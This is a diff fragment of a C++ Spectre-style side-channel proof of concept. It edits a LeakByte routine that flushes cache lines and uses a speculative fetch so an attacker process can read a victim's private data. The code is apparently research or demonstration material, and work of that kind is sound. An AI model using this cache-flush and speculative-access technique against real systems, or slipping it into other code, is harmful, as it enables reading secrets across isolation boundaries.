@@ -110,9 +110,8 @@ static char LeakByte(size_t offset) {
       //                    ? public_data_accesor.get();
       // Parent (victim) uses public_data_accessor, child (attacker) uses
       // private_data_accessor.
-      pointer = private_data_accessor.get() +
-                static_cast<bool>(pid) *
-                    (public_data_accessor.get() - private_data_accessor.get());
+      pointer = private_data_accessor.get() + static_cast<bool>(pid) * (
+          public_data_accessor.get() - private_data_accessor.get());
     }
 
     for (size_t i = 0; i < kAccessorArrayLength; ++i) {
@@ -125,6 +124,7 @@ static char LeakByte(size_t offset) {
       for (size_t j = 0; j < sizeof(PublicDataAccessor); j += kCacheLineSize) {
         CLFlush(accessor_bytes + j);
       }
+      CLFlush(accessor_bytes + sizeof(PublicDataAccessor) - 1);
 
       // Speculative fetch at the offset. Architecturally the victim fetches
       // always from the public_data, though speculatively it fetches the
